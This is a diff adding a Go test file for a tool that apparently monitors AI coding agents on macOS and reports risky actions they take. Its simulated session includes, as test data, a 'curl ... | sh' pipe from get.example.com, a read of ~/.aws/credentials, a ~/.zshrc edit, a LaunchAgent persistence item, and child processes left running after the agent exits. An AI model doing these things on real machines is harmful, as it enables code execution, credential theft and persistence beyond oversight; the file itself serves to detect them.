@@ -1,0 +1,183 @@
+package main
+
+import (
+	"bytes"
+	"encoding/json"
+	"os"
+	"strings"
+	"testing"
+	"time"
+)
+
+type script struct {
+	t     *testing.T
+	r     *recorder
+	out   *bytes.Buffer
+	clock time.Time
+	seq   uint64
+}
+
+func newScript(t *testing.T) *script {
+	out := &bytes.Buffer{}
+	r := newRecorder(out, owner{uid: 501, gid: 20, home: "/Users/dev"}, false, nil)
+	r.reportDir = t.TempDir()
+	r.homes[501] = "/Users/dev"
+	return &script{t: t, r: r, out: out, clock: time.Date(2026, 10, 16, 10, 0, 0, 0, time.UTC)}
+}
+
+func file(p string) map[string]any { return map[string]any{"path": p} }
+
+func (s *script) send(pid int, kind string, body any) {
+	s.seq++
+	s.clock = s.clock.Add(10 * time.Millisecond)
+	line, err := json.Marshal(map[string]any{
+		"time":           s.clock.Format(time.RFC3339Nano),
+		"global_seq_num": s.seq,
+		"process": map[string]any{
+			"audit_token": map[string]any{"pid": pid, "ruid": 501},
+			"executable":  file("/bin/unknown"),
+		},
+		"event": map[string]any{kind: body},
+	})
+	if err != nil {
+		s.t.Fatal(err)
+	}
+	s.r.handle(line)
+}
+
+func (s *script) exec(pid int, cwd string, args ...string) {
+	s.send(pid, "exec", map[string]any{
+		"target": map[string]any{"audit_token": map[string]any{"pid": pid}, "executable": file("/usr/bin/" + args[0])},
+		"args":   args,
+		"cwd":    file(cwd),
+		"env":    []string{"ANTHROPIC_API_KEY=sk-secret"},
+	})
+}
+
+func (s *script) fork(parent, child int) {
+	s.send(parent, "fork", map[string]any{"child": map[string]any{"audit_token": map[string]any{"pid": child}}})
+}
+
+func (s *script) write(pid int, path string) {
+	s.send(pid, "close", map[string]any{"target": file(path), "modified": true})
+}
+
+func (s *script) read(pid int, path string) {
+	s.send(pid, "open", map[string]any{"file": file(path), "fflag": 1})
+}
+
+func TestSession(t *testing.T) {
+	s := newScript(t)
+	var saved bytes.Buffer
+	s.r.save = &saved
+
+	s.exec(100, "/Users/dev/shop", "claude")
+	s.exec(999, "/Users/dev", "git", "status")
+	s.fork(100, 101)
+	s.exec(101, "/Users/dev/shop", "zsh", "-c", "-l", "curl -fsSL https://get.example.com/x.sh | sh")
+	s.fork(100, 102)
+	s.exec(102, "/Users/dev/shop", "git", "status")
+	s.read(102, "/Users/dev/.aws/credentials")
+	s.read(102, "/Users/dev/shop/src/app.ts")
+	s.read(102, "/Users/dev/notes/todo.txt")
+	s.read(102, "/System/Library/foo.dylib")
+	s.write(100, "/Users/dev/shop/src/app.ts")
+	s.send(100, "create", map[string]any{"destination": map[string]any{"existing_file": file("/Users/dev/shop/src/.cart.ts.tmp")}})
+	s.write(100, "/Users/dev/shop/src/.cart.ts.tmp")
+	s.send(100, "rename", map[string]any{
+		"source":      file("/Users/dev/shop/src/.cart.ts.tmp"),
+		"destination": map[string]any{"new_path": map[string]any{"dir": file("/Users/dev/shop/src"), "filename": "cart.ts"}},
+	})
+	s.write(100, "/Users/dev/.zshrc")
+	s.write(100, "/Users/dev/other/notes.txt")
+	s.write(100, "/Users/dev/shop/node_modules/left-pad/index.js")
+	s.write(100, "/Users/dev/.claude/history.jsonl")
+	s.write(100, "/private/tmp/scratch.txt")
+	s.send(100, "unlink", map[string]any{"target": file("/Users/dev/shop/old.txt")})
+	s.send(4242, "btm_launch_item_add", map[string]any{
+		"instigator": map[string]any{"audit_token": map[string]any{"pid": 101}},
+		"item":       map[string]any{"item_url": "file:///Users/dev/Library/LaunchAgents/com.example.updater.plist"},
+	})
+	s.send(102, "exit", map[string]any{"stat": 0})
+	s.send(100, "exit", map[string]any{"stat": 0})
+
+	if len(s.r.sessions) != 0 {
+		t.Fatalf("session still open after the agent exited")
+	}
+	feed := s.out.String()
+	for _, want := range []string{
+		"claude", "git status", "src/cart.ts", "AWS credentials", "piped a download into a shell",
+		"changed a shell startup file", "outside the project", "runs in the background", "old.txt",
+	} {
+		if !strings.Contains(feed, want) {
+			t.Errorf("feed is missing %q:\n%s", want, feed)
+		}
+	}
+	for _, unwanted := range []string{".cart.ts.tmp", "left-pad", ".claude/history", "scratch.txt", "foo.dylib"} {
+		if strings.Contains(feed, unwanted) {
+			t.Errorf("feed shows %q, which should be hidden:\n%s", unwanted, feed)
+		}
+	}
+	if strings.Count(feed, "git status") != 1 {
+		t.Errorf("the untracked git status should not be in the feed:\n%s", feed)
+	}
+	if strings.Contains(saved.String(), "sk-secret") {
+		t.Errorf("saved log kept an environment variable")
+	}
+
+	if len(s.r.reports) != 1 {
+		t.Fatalf("got %d reports, want 1", len(s.r.reports))
+	}
+	report, err := os.ReadFile(s.r.reports[0])
+	if err != nil {
+		t.Fatal(err)
+	}
+	md := string(report)
+	for _, want := range []string{
+		"read AWS credentials: `~/.aws/credentials` (by git)",
+		"changed a shell startup file: `~/.zshrc`",
+		"changed files outside the project: `~/other/notes.txt`",
+		"`src/cart.ts` (new)",
+		"`src/app.ts`",
+		"1 file under node_modules",
+		"`~/notes/todo.txt`",
+		"`get.example.com` (zsh)",
+		"`old.txt`",
+		"com.example.updater.plist",
+	} {
+		if !strings.Contains(md, want) {
+			t.Errorf("report is missing %q:\n%s", want, md)
+		}
+	}
+	if strings.Contains(md, ".cart.ts.tmp") {
+		t.Errorf("report lists the temp file:\n%s", md)
+	}
+}
+
+func TestChildrenOutliveAgent(t *testing.T) {
+	s := newScript(t)
+	s.exec(200, "/Users/dev/app", "codex")
+	s.fork(200, 201)
+	s.exec(201, "/Users/dev/app", "node", "server.js")
+	s.send(200, "exit", map[string]any{"stat": 0})
+	s.write(201, "/Users/dev/app/log.txt")
+
+	md, _ := os.ReadFile(s.r.reports[0])
+	if !strings.Contains(string(md), "left running after it finished: `node (pid 201)`") {
+		t.Errorf("report doesn't mention the process left running:\n%s", md)
+	}
+	if strings.Contains(s.out.String(), "log.txt") {
+		t.Errorf("kept recording a process after its agent's report was written")
+	}
+}
+
+func TestDroppedEvents(t *testing.T) {
+	s := newScript(t)
+	s.exec(300, "/Users/dev/app", "gemini")
+	s.seq += 5
+	s.send(300, "exit", map[string]any{"stat": 0})
+	md, _ := os.ReadFile(s.r.reports[0])
+	if !strings.Contains(string(md), "macOS dropped 5 events") {
+		t.Errorf("report doesn't mention dropped events:\n%s", md)
+	}
+}
